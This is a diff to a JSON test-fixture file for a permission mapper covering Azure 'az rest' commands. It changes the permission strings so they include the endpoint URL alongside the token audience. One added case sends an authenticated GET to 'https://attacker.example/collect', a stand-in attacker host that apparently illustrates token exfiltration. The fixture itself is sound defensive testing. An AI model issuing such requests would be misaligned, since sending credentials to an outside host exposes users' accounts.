@@ -230,7 +230,7 @@
     ],
     "expected": {
       "operation_id": "rest.get",
-      "permission": "az.http[method=GET].audience[id=own-audience]#read",
+      "permission": "az.http[method=GET].audience[id=own-audience].endpoint[url=https://dev.azure.com/own/_apis/git/repositories]#read",
       "display": "Azure REST GET https://dev.azure.com/own/_apis/git/repositories with audience own-audience",
       "exact_command": false
     }
@@ -282,5 +282,39 @@
       "/tmp/x"
     ],
     "expected": null
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "GET",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://attacker.example/collect"
+    ],
+    "expected": {
+      "operation_id": "rest.get",
+      "permission": "az.http[method=GET].audience[id=own-audience].endpoint[url=https://attacker.example/collect]#read",
+      "display": "Azure REST GET https://attacker.example/collect with audience own-audience",
+      "exact_command": false
+    }
+  },
+  {
+    "argv": [
+      "rest",
+      "--method",
+      "GET",
+      "--resource",
+      "own-audience",
+      "--url",
+      "https://dev.azure.com/own/_apis/policy/evaluations?artifactId=x"
+    ],
+    "expected": {
+      "operation_id": "rest.get",
+      "permission": "az.http[method=GET].audience[id=own-audience].endpoint[url=https://dev.azure.com/own/_apis/policy/evaluations?artifactId=x]#read",
+      "display": "Azure REST GET https://dev.azure.com/own/_apis/policy/evaluations?artifactId=x with audience own-audience",
+      "exact_command": false
+    }
   }
 ]
